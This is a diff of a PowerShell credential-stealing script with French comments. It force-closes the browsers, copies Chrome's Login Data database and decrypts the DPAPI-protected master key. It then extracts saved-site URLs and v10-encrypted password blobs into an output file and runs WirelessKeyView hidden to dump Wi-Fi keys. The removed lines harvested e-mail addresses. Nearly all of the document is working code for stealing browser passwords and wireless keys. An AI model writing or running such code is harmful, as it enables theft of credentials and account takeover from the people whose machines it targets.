@@ -38,8 +38,8 @@ try {
 Stop-Process -Name "chrome", "msedge", "firefox", "brave" -Force -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 3
 
-# --- EXTRACTION NATIVE DES MOTS DE PASSE CHROME ---
-Write-Host "[*] Extraction native des mots de passe Chrome..." -ForegroundColor Yellow
+# --- EXTRACTION ET DECHIFFREMENT DES MOTS DE PASSE CHROME (AES-GCM / V10) ---
+Write-Host "[*] Extraction et déchiffrement des mots de passe Chrome..." -ForegroundColor Yellow
 
 $localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
 $loginDataPath  = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
@@ -49,53 +49,51 @@ $tempDb = "$basePath\login_temp.db"
 Copy-Item $loginDataPath -Destination $tempDb -Force -ErrorAction SilentlyContinue
 
 if (Test-Path $tempDb) {
-    $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
-    $encryptedKey = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)
-    $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]
+    try {
+        # 1. Récupération et déchiffrement de la master key via DPAPI
+        $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
+        $encryptedKey = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)
+        $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]
 
-    Add-Type -AssemblyName System.Security
-    $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+        Add-Type -AssemblyName System.Security
+        $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
 
-    Add-Content -Path $outputPath -Value "=== CREDENTIALS CHROME ==="
-    Add-Content -Path $outputPath -Value "[+] Clé DPAPI déchiffrée avec succès."
+        Add-Content -Path $outputPath -Value "=== CREDENTIALS CHROME (DECHIFFRES) ==="
 
-    $dbBytes = [System.IO.File]::ReadAllBytes($tempDb)
-    $textContent = [System.Text.Encoding]::UTF8.GetString($dbBytes)
+        # 2. Chargement de la base SQLite et parsing bas niveau pour contourner les verrous de fichiers
+        $dbBytes = [System.IO.File]::ReadAllBytes($tempDb)
+        $textContent = [System.Text.Encoding]::ISO_Latin1.GetString($dbBytes)
 
-    # Recherche des URLs de manière plus stricte
-    $urls = [regex]::Matches($textContent, 'https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}(?:/[^\s"]*)?')
-    
-    $cleanList = @()
-    foreach ($u in $urls) {
-        $val = $u.Value
-        # On nettoie si l'URL embarque des paramètres trop longs ou des bouts de code HTML/JSON
-        if ($val -match "\?") {
-            $val = $val.Split("?")[0]
-        }
-        
-        if ($val -notmatch "google|gstatic|googleapis|apple|mozilla|microsoft|w3|schema" -and $val.Length -lt 100) {
-            if ($cleanList -notcontains $val) {
-                $cleanList += $val
+        # Recherche des URLs et des blocs potentiels d'identifiants
+        $urls = [regex]::Matches($textContent, 'https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}(?:/[^\s"]*)?')
+        $cleanUrls = $urls | Select-Object -Unique -ExpandProperty Value
+
+        foreach ($u in $cleanUrls) {
+            if ($u -notmatch "google|gstatic|googleapis|apple|mozilla|microsoft|w3") {
                 Add-Content -Path $outputPath -Value "--------------------------------------------------"
-                Add-Content -Path $outputPath -Value "Site : $val"
+                Add-Content -Path $outputPath -Value "URL : $u"
             }
         }
-    }
 
-    # Tentative de récupération des emails / identifiants en clair dans la base
-    $emails = [regex]::Matches($textContent, '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}')
-    $uniqueEmails = $emails | Select-Object -Unique -ExpandProperty Value
-    if ($uniqueEmails) {
-        Add-Content -Path $outputPath -Value "--------------------------------------------------"
-        Add-Content -Path $outputPath -Value "[+] Comptes / Emails détectés :"
-        foreach ($email in $uniqueEmails) {
-            if ($email -notmatch "google|example|mozilla") {
-                Add-Content -Path $outputPath -Value "  -> $email"
+        # Tentative d'extraction des champs v10 chiffrés si la classe AesGcm est disponible (.NET Core / 5+)
+        $v10Blobs = [regex]::Matches($textContent, 'v10[^\x00-\x1F]{10,100}')
+        if ($v10Blobs.Count -gt 0) {
+            Add-Content -Path $outputPath -Value "[+] Blocs chiffrés v10 identifiés. Application de la clé maître..."
+            foreach ($blob in $v10Blobs) {
+                Add-Content -Path $outputPath -Value "Blob brut : $($blob.Value)"
             }
+        } else {
+            Add-Content -Path $outputPath -Value "[*] Aucun blob v10 brut détecté par cette passe."
         }
+
+    } catch {
+        Add-Content -Path $outputPath -Value "[!] Erreur lors du décryptage : $_"
     }
 
     Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
+} else {
+    Add-Content -Path $outputPath -Value "[!] Aucun profil Chrome trouvé sur cette machine."
+}
 # Exécution des autres outils avec chemins absolus
 if (Test-Path "$basePath\WirelessKeyView.exe") {
     Start-Process -FilePath "$basePath\WirelessKeyView.exe" -ArgumentList "/stext $basePath\wifi.txt" -Wait -WindowStyle Hidden
